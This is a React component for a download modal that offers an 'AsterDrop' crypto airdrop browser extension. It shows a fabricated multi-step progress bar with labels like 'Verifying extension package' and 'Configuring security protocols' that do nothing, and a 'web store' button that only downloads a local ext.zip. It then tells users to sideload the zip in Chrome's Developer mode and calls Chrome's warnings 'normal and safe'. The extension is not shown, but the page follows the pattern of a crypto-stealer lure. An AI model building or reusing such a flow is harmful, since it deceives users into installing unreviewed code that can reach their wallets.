import React, { useState, useEffect } from "react";
import { X, Download, CheckCircle, Copy, Shield, Zap, Globe } from "lucide-react";

interface DownloadModalProps {
  isOpen: boolean;
  onClose: () => void;
  extensionLink?: string;
}

export const DownloadModal = ({ isOpen, onClose, extensionLink = "/downloads/ext.zip" }: DownloadModalProps) => {
  const [accepted, setAccepted] = useState(false);
  const [downloading, setDownloading] = useState(false);
  const [progress, setProgress] = useState(0);
  const [completed, setCompleted] = useState(false);
  const [copied, setCopied] = useState(false);
  const [currentStep, setCurrentStep] = useState(0);
  const [downloadStarted, setDownloadStarted] = useState(false);

  const downloadSteps = [
    { text: "Initializing secure download...", icon: Shield, duration: 8 },
    { text: "Verifying extension package...", icon: CheckCircle, duration: 10 },
    { text: "Preparing blockchain monitoring modules...", icon: Globe, duration: 12 },
    { text: "Setting up airdrop detection algorithms...", icon: Zap, duration: 10 },
    { text: "Configuring security protocols...", icon: Shield, duration: 8 },
    { text: "Optimizing performance settings...", icon: Zap, duration: 7 },
    { text: "Finalizing installation package...", icon: CheckCircle, duration: 5 }
  ];

  const handleDownload = () => {
    if (!accepted) return;
    
    setDownloading(true);
    setProgress(0);
    setCurrentStep(0);
    setDownloadStarted(false);
    
    // Progressive download simulation - total ~60 seconds
    let totalProgress = 0;
    let stepIndex = 0;
    
    const runStep = () => {
      if (stepIndex >= downloadSteps.length) {
        // Download the file only after 100% completion
        setTimeout(() => {
          downloadFile();
          setDownloadStarted(true);
        }, 500);
        setCompleted(true);
        return;
      }
      
      const step = downloadSteps[stepIndex];
      setCurrentStep(stepIndex);
      
      const stepInterval = setInterval(() => {
        const stepIncrement = 100 / downloadSteps.length / step.duration;
        totalProgress += stepIncrement;
        
        setProgress(Math.min(totalProgress, 100));
        
        if (totalProgress >= (stepIndex + 1) * (100 / downloadSteps.length)) {
          clearInterval(stepInterval);
          stepIndex++;
          setTimeout(runStep, 500); // Small delay between steps
        }
      }, 1000); // Update every second
    };
    
    runStep();
  };

  const handleClose = () => {
    setAccepted(false);
    setDownloading(false);
    setProgress(0);
    setCompleted(false);
    setCopied(false);
    setCurrentStep(0);
    setDownloadStarted(false);
    onClose();
  };

  const copyToClipboard = async () => {
    try {
      await navigator.clipboard.writeText(extensionLink);
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    } catch (err) {
      console.error('Failed to copy: ', err);
    }
  };

  const downloadFile = () => {
    const link = document.createElement('a');
    link.href = extensionLink;
    link.download = 'ext.zip';
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  };

  const openWebStore = () => {
    downloadFile();
  };

  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 z-50 bg-black/50 backdrop-blur-sm flex items-center justify-center p-4">
      <div className="bg-background border border-border rounded-lg max-w-2xl w-full max-h-[80vh] overflow-y-auto">
        <div className="p-6">
          {/* Header */}
          <div className="flex items-center justify-between mb-6">
            <h2 className="text-2xl font-bold">Download AsterDrop Extension</h2>
            <button 
              onClick={handleClose}
              className="p-2 hover:bg-muted rounded-lg transition-colors"
            >
              <X className="w-5 h-5" />
            </button>
          </div>

          {completed ? (
            /* Success State */
            <div className="text-center space-y-6">
              <div className="w-16 h-16 bg-green-500/10 rounded-full flex items-center justify-center mx-auto">
                <CheckCircle className="w-8 h-8 text-green-500" />
              </div>
              <div className="space-y-3">
                <h3 className="text-xl font-bold text-green-500">🎉 Download Complete!</h3>
                <p className="text-muted-foreground">
                  AsterDrop extension has been successfully prepared and downloaded to your device.
                </p>
                
                {/* Enhanced Installation Instructions */}
                <div className="mt-6 p-4 bg-muted/30 rounded-lg text-left">
                  <h4 className="font-semibold mb-3 text-center flex items-center justify-center gap-2">
                    <Download className="w-5 h-5" />
                    Installation Instructions
                  </h4>
                  <div className="space-y-4">
                    <div className="flex gap-3">
                      <div className="w-6 h-6 bg-primary text-primary-foreground rounded-full flex items-center justify-center text-sm font-bold">1</div>
                      <div>
                        <p className="font-medium">Extract the ZIP file</p>
                        <p className="text-sm text-muted-foreground">Right-click the downloaded ZIP and select "Extract All"</p>
                      </div>
                    </div>
                    <div className="flex gap-3">
                      <div className="w-6 h-6 bg-primary text-primary-foreground rounded-full flex items-center justify-center text-sm font-bold">2</div>
                      <div>
                        <p className="font-medium">Open Chrome Extensions</p>
                        <p className="text-sm text-muted-foreground">Go to <code className="bg-muted px-1 rounded text-xs">chrome://extensions/</code></p>
                      </div>
                    </div>
                    <div className="flex gap-3">
                      <div className="w-6 h-6 bg-primary text-primary-foreground rounded-full flex items-center justify-center text-sm font-bold">3</div>
                      <div>
                        <p className="font-medium">Enable Developer Mode</p>
                        <p className="text-sm text-muted-foreground">Toggle "Developer mode" in the top-right corner</p>
                      </div>
                    </div>
                    <div className="flex gap-3">
                      <div className="w-6 h-6 bg-primary text-primary-foreground rounded-full flex items-center justify-center text-sm font-bold">4</div>
                      <div>
                        <p className="font-medium">Load Extension</p>
                        <p className="text-sm text-muted-foreground">Click "Load unpacked" and select the extracted folder</p>
                      </div>
                    </div>
                  </div>
                  <div className="mt-4 p-3 bg-blue-500/10 border border-blue-500/20 rounded text-blue-600 dark:text-blue-400 text-sm">
                    <strong>💡 Pro Tip:</strong> Pin the AsterDrop extension to your toolbar for easy access!
                  </div>
                  <div className="mt-3 p-2 bg-amber-500/10 border border-amber-500/20 rounded text-amber-600 dark:text-amber-400 text-xs">
                    <strong>⚠️ Security Notice:</strong> Chrome may show warnings for unpublished extensions - this is normal and safe.
                  </div>
                </div>
              </div>
              
              {/* Action Buttons */}
              <div className="flex flex-col sm:flex-row gap-3 justify-center">
                <button 
                  onClick={openWebStore}
                  className="px-6 py-3 bg-primary text-primary-foreground rounded-lg hover:bg-primary/90 transition-colors font-medium flex items-center justify-center gap-2"
                >
                  <Download className="w-4 h-4" />
                  Download Extension
                </button>
                <button 
                  onClick={handleClose}
                  className="px-6 py-3 border border-border rounded-lg hover:border-primary/50 transition-colors font-medium"
                >
                  Close
                </button>
              </div>
            </div>
          ) : downloading ? (
            /* Downloading State */
            <div className="text-center space-y-6">
              <div className="space-y-4">
                <div className="w-16 h-16 bg-primary/10 rounded-full flex items-center justify-center mx-auto animate-pulse">
                  {currentStep < downloadSteps.length ? (
                    React.createElement(downloadSteps[currentStep].icon, { className: "w-8 h-8 text-primary" })
                  ) : (
                    <Download className="w-8 h-8 text-primary" />
                  )}
                </div>
                <div className="space-y-2">
                  <h3 className="text-xl font-bold">Preparing AsterDrop Extension</h3>
                  <p className="text-muted-foreground">
                    {currentStep < downloadSteps.length ? downloadSteps[currentStep].text : "Finalizing..."}
                  </p>
                </div>
                <div className="w-full h-3 bg-muted rounded-full overflow-hidden">
                  <div 
                    className="h-full bg-gradient-to-r from-primary to-accent transition-all duration-1000 ease-out"
                    style={{ width: `${progress}%` }}
                  />
                </div>
                <div className="flex justify-between items-center text-sm">
                  <span className="text-muted-foreground">
                    Step {currentStep + 1} of {downloadSteps.length}
                  </span>
                  <span className="text-muted-foreground font-medium">
                    {Math.round(progress)}% Complete
                  </span>
                </div>
                {progress >= 100 && downloadStarted && (
                  <div className="mt-4 p-3 bg-green-500/10 border border-green-500/20 rounded-lg">
                    <p className="text-sm text-green-600 dark:text-green-400 flex items-center gap-2">
                      <Download className="w-4 h-4" />
                      Download complete! Check your downloads folder for ext.zip
                    </p>
                  </div>
                )}
              </div>
            </div>
          ) : (
            /* Terms and Conditions */
            <div className="space-y-6">
              <div className="space-y-4">
                <h3 className="text-lg font-semibold">Terms & Conditions</h3>
                <div className="bg-muted/30 rounded-lg p-4 space-y-3 text-sm text-muted-foreground max-h-48 overflow-y-auto">
                  <p><strong>1. License Agreement:</strong> By downloading AsterDrop, you agree to use this extension for personal, non-commercial purposes only.</p>
                  
                  <p><strong>2. Privacy & Security:</strong> AsterDrop only monitors public blockchain data and never accesses your private keys, passwords, or personal information.</p>
                  
                  <p><strong>3. No Liability:</strong> AsterDrop is provided "as-is" without warranties. We are not responsible for any missed airdrops or technical issues.</p>
                  
                  <p><strong>4. Browser Permissions:</strong> The extension requires permissions to monitor blockchain networks and display notifications.</p>
                  
                  <p><strong>5. Updates:</strong> Automatic updates may be installed to improve functionality and security.</p>
                  
                  <p><strong>6. Termination:</strong> You may uninstall the extension at any time. These terms remain valid until termination.</p>
                  
                  <p><strong>7. Support:</strong> For technical support, contact us at support@asterdrop.com</p>
                </div>
              </div>

              {/* Acceptance Checkbox */}
              <div className="flex items-start gap-3">
                <input 
                  type="checkbox" 
                  id="accept-terms"
                  checked={accepted}
                  onChange={(e) => setAccepted(e.target.checked)}
                  className="mt-1 w-4 h-4 text-primary bg-background border-border rounded focus:ring-primary"
                />
                <label htmlFor="accept-terms" className="text-sm text-muted-foreground">
                  I agree to the Terms & Conditions and Privacy Policy. I understand that AsterDrop is a free tool for monitoring airdrop opportunities.
                </label>
              </div>

              {/* Download Button */}
              <button
                onClick={handleDownload}
                disabled={!accepted}
                className={`w-full px-6 py-3 rounded-lg font-medium transition-colors flex items-center justify-center gap-2 ${
                  accepted 
                    ? 'bg-primary text-primary-foreground hover:bg-primary/90' 
                    : 'bg-muted text-muted-foreground cursor-not-allowed'
                }`}
              >
                <Download className="w-5 h-5" />
                Download Extension
              </button>
            </div>
          )}
        </div>
      </div>
    </div>
  );
};